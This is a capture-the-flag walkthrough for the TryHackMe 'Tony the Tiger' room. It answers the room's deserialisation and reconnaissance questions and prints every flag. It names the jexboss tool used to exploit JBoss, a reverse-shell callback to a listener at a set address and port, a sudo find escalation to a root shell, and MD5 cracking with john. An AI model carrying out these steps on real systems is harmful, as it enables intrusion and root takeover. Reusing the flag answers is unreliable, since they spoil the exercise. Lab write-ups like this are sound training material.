# TONY THE TIGER

## BASIC INFO
```
export IP=10.10.89.216
```


## SUPPORT MATERIAL
> - **What is a great IRL example of an "Object"?**
>> lamp

> - **What is the acronym of a possible type of attack resulting from a "serialisation" attack?**
>> DoS

> - **What lower-level format does data within "Objects" get converted into?**
>> byte streams


## RECONNAISSANCE

> - **What service is running on port "8080"**
>> Apache Tomcat/Coyote JSP engine 1.1

> - **What is the name of the front-end application running on "8080"?**
>> JBoss

## FIND TONY'S FLAG

> - **This flag will have the formatting of "THM{}"**
>> THM{Tony_Sure_Loves_Frosted_Flakes}

On one of the post there's an image. Running strings on it reveals the flag.


## EXPLOIT
Instead of using the one the creator provided, I used the one I found [github](https://github.com/joaomatosf/jexboss). Following the instruction we manage to get a shell. But this shell is quite restricted. So we set up a listener on our local machine, then run `jexremote=10.11.7.208:9001` to get a reverse shell.


## FIND USER JBOSS'S FLAG

> - **This flag has the formatting of "THM{}"**
>> THM{50c10ad46b5793704601ecdad865eb06}

Once we get a reverse shell, we saw a to-do.txt on our home directory. It mentioned something about writing a notes to JBoss. Let's try to checkout JBoss home directory. so there's a note inside with JBoss's password. Switch user to JBoss and we saw a `.jboss.txt`. That's the flag.

## ESCALATION!

> - **The final flag does not have the formatting of "THM{}"**
>> zxcvbnm123456789

To escalate, try running `sudo -l`. Seems like we can run find as sudo without password. `find . -exec /bin/bash \; -quit` and we're root. Cat out root.txt and it seems like a base64 encoded string. After decoding it it seems like a hash? Using `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5` we manage to crack it.
